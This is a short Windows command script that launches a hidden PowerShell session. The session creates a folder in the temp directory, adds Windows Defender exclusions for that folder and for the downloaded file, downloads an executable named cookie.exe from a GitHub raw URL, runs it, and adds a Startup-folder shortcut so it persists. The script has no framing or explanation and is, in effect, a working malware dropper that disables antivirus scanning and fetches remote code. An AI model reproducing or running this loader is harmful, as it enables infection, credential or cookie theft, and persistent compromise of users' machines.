start /min powershell.exe -WindowStyle Hidden -Command "
$A=[System.IO.Path]::Combine($env:temp,'System')
if(-not(Test-Path -Path $A)){New-Item -Path $A -ItemType Directory -Force}
try{Add-MpPreference -ExclusionPath $A}catch{}
$B='https://github.com/PXTDEV9022/tiendev/raw/refs/heads/main/python.txt'
$C=[System.IO.Path]::Combine($A,'cookie.exe')
Invoke-WebRequest -Uri $B -OutFile $C
try{Add-MpPreference -ExclusionProcess $C}catch{}
Start-Process -FilePath $C -ArgumentList '-Bypass'

$StartupPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\Start Menu\Programs\Startup')
$ShortcutPath = [System.IO.Path]::Combine($StartupPath, 'cookie.lnk')
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut($ShortcutPath)
$Shortcut.TargetPath = $C
$Shortcut.Save()

Exit"
